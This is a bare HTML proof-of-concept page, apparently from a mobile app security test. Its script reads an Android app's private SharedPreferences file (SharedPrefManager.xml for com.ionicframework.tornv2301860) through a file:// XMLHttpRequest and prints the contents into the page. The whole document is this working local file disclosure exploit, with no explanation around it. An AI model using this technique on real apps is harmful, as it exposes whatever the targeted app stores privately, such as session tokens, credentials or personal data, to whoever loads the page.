<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<script type="text/javascript">
  function fileAccess(path, callback) {
    var req = new XMLHttpRequest();

    req.open('GET', 'file://' + path, true);
    req.onload = function (e) {
      callback(req.responseText);
    };
    req.onerror = function (e) {
      callback(null);
    };
    req.send();
  }

  var file = '/data/data/com.ionicframework.tornv2301860/shared_prefs/SharedPrefManager.xml';

  fileAccess(file, function (contents) {
    document.body.innerText = contents;
  });
</script>
</head>
</html>
